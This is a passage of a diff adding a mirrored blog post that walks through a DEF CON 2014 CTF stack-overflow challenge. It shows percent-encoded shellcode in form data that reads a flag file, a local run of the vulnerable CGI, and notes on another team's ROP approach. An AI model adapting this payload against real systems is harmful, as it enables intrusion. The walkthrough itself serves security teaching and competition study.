class='o'>%</span><span class='n'>BB</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='n'>F7</span><span class='o'>%</span><span class='n'>DB</span><span class='o'>%</span><span class='mi'>89</span><span class='o'>%</span><span class='n'>F1</span><span class='o'>%</span><span class='mi'>88</span><span class='o'>%</span><span class='n'>C2</span><span class='o'>%</span><span class='mi'>31</span><span class='o'>%</span><span class='n'>C0</span><span class='o'>%</span><span class='n'>B0</span><span class='o'>%</span><span class='mi'>04</span><span class='o'>%</span><span class='n'>CD</span><span class='o'>%</span><span class='mi'>80</span><span class='o'>%</span><span class='mi'>31</span><span class='o'>%</span><span class='n'>C0</span><span class='o'>%</span><span class='n'>B0</span><span class='o'>%</span><span class='mi'>01</span><span class='o'>%</span><span class='n'>CD</span><span class='o'>%</span><span class='mi'>80</span><span class='o'>%</span><span class='n'>E8</span><span class='o'>%</span><span class='n'>CB</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='n'>FF</span><span class='o'>%</span><span class='mi'>2</span><span class='n'>F</span><span class='o'>%</span><span class='mi'>68</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>F</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>D</span><span class='o'>%</span><span class='mi'>65</span><span class='o'>%</span><span class='mi'>2</span><span class='n'>F</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>E</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>F</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>E</span><span class='o'>%</span><span class='mi'>61</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>D</span><span class='o'>%</span><span class='mi'>65</span><span class='o'>%</span><span class='mi'>79</span><span class='o'>%</span><span class='mi'>65</span><span class='o'>%</span><span class='mi'>74</span><span class='o'>%</span><span class='mi'>2</span><span class='n'>F</span><span class='o'>%</span><span class='mi'>66</span><span class='o'>%</span><span class='mi'>6</span><span class='n'>C</span><span class='o'>%</span><span class='mi'>61</span><span class='o'>%</span><span class='mi'>67</span><span class='o'>%</span><span class='mi'>00</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='o'>--</span>
+
+<span class='n'>$</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>Angry</span> <span class='n'>Rhinoceros</span> <span class='n'>And</span> <span class='n'>then</span> <span class='n'>I</span> <span class='n'>found</span> <span class='n'>five</span> <span class='n'>dollars</span><span class='o'>.</span>
+</code></pre></div>
+<p>The only thing left to do is to send this over a socket to the web server so that I can pull back the flag on the remote system. Too bad the service was offline by the time I completed the challenge.</p>
+
+<p>There are other ways to go about landing this stack overflow. Another public write up is <a href="http://blog.orange.tw/2014/05/defcon-ctf-quals-2014-nonameyet-write-up.html">here</a> (in Chinese). It looks like this team made a ROP chain to getenv() that would read in cookie data. The same stack overflow bug was used.</p>
+
+<p>Big thanks to HJ and Legit BS for a fun CTF problem. I spent way too much time playing with it. If you enjoyed this walk through or have questions or comments, you are welcome to email me: svittitoe at endgame.com.</p>
+
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+        <div class="addthis_native_toolbox"></div>
+
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+		<script type="text/javascript" src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-53c7dc1328ec3211"></script>
+
+    </div>
+
+    <footer class='site__footer cf'>
+      <div class='wrapper'>
+      <div class='f-left'>
+	<small>&copy; Endgame 2014. All Rights Reserved | Subscribe to our <a href="../feed.xml" target="_blank">RSS</a> feed</small>
+      </div>
+      <div class='f-right'>
+	<a class='logo' href="../index.html">
+	  <img alt="Endgame logo" src="../images/logo.svg">
+	</a>
+      </div>
+    </div><!--//wrapper-->
+    </footer>
+    
+    <a href='#top' class='js-top top'></a>
+    <script src="../javascripts/jquery.js"></script>
+    <script src="../javascripts/waypoints.min.js"></script>
+    
+    
+    <script src="../javascripts/jquery.cycle2.min.js"></script>
+    <script src="../javascripts/app.js"></script>
+    
+</body>
+
+<!-- Mirrored from www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Nov 2014 14:55:11 GMT -->
+</html>
